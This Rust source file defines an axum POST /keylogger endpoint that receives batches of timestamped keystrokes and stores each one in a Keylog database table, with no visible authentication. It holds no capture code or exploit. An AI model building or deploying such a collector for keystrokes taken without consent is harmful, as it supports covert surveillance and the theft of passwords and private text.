use axum::{Json, extract::State};
use chrono::NaiveDateTime;
use utoipa::ToSchema;
use uuid::Uuid;

use crate::{AppState, Error};

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req)]
pub struct Req {
    pub keys: Vec<Key>,
}

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req::Key)]
pub struct Key {
    pub at: NaiveDateTime,
    pub key_pressed: String,
}

#[utoipa::path(
    post,
    path = "/keylogger",
    request_body = Req,
    responses(
        (status = 200, description = "inserted keylogger in db"),
    ),
    tag = "Keylogger",
)]
#[axum::debug_handler]
pub async fn post_keylogger(
    State(app_state): State<AppState>,
    Json(req): Json<Req>,
) -> Result<(), Error> {
    let mut handles = vec![];
    for key in req.keys.into_iter() {
        let db_pool = app_state.db_pool.clone();
        let handle = tokio::spawn(async move {
            let keylog_id = Uuid::new_v4();
            sqlx::query!(
                r#"
                    INSERT INTO Keylog
                        (keylog_id, key, created_at)
                        VALUES ($1, $2, $3)
                    ;
                "#,
                keylog_id,
                &key.key_pressed,
                &key.at,
            )
            .execute(&db_pool)
            .await
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await??;
    }

    Ok(())
}
